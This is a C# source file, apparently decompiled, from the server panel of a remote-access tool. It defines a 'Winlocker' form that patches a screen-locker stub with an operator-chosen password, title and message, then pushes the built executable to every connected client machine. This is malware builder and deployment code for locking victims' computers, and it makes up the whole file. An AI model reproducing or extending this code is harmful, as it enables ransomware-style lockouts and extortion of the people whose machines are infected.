using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Leb128;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000A5 RID: 165
	public partial class FormWinlocker : FormMaterial
	{
		// Token: 0x060004A9 RID: 1193 RVA: 0x0003C97E File Offset: 0x0003AB7E
		public FormWinlocker()
		{
			this.InitializeComponent();
		}

		// Token: 0x060004AA RID: 1194 RVA: 0x0003C98C File Offset: 0x0003AB8C
		private void FormWinlocker_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
		}

		// Token: 0x060004AB RID: 1195 RVA: 0x0003C9AC File Offset: 0x0003ABAC
		private void ChangeScheme(object sender)
		{
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.BackColor = FormMaterial.PrimaryColor;
			this.rjButton5.BackColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x060004AC RID: 1196 RVA: 0x0003CA0C File Offset: 0x0003AC0C
		private void rjButton5_Click(object sender, EventArgs e)
		{
			string text = "Stub\\WinlockerBulid.exe";
			using (ModuleDefMD moduleDefMD = ModuleDefMD.Load("Stub\\Winlocker.exe", new ModuleCreationOptions { TryToLoadPdbFromDisk = false }))
			{
				foreach (TypeDef typeDef in moduleDefMD.Types)
				{
					foreach (MethodDef methodDef in typeDef.Methods)
					{
						if (methodDef.Body != null)
						{
							for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
							{
								if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
								{
									if ((string)methodDef.Body.Instructions[i].Operand == "%Password%")
									{
										methodDef.Body.Instructions[i].Operand = this.rjTextBox1.Texts;
									}
									if ((string)methodDef.Body.Instructions[i].Operand == "%Title%")
									{
										methodDef.Body.Instructions[i].Operand = this.rjTextBox2.Texts;
									}
									if ((string)methodDef.Body.Instructions[i].Operand == "%Description%")
									{
										methodDef.Body.Instructions[i].Operand = this.rjTextBox3.Texts;
									}
								}
							}
						}
					}
				}
				moduleDefMD.Write(text);
				moduleDefMD.Dispose();
			}
			string checksum2 = Methods.GetChecksum(text);
			byte[] pack = LEB128.Write(new object[]
			{
				"SendDiskGet",
				text,
				checksum2
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Clients[] array = this.clients;
			for (int j = 0; j < array.Length; j++)
			{
				Clients clients = array[j];
				Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
			base.Close();
		}

		// Token: 0x060004AD RID: 1197 RVA: 0x0003CCB8 File Offset: 0x0003AEB8
		private void rjButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0400031A RID: 794
		public Clients[] clients;
	}
}
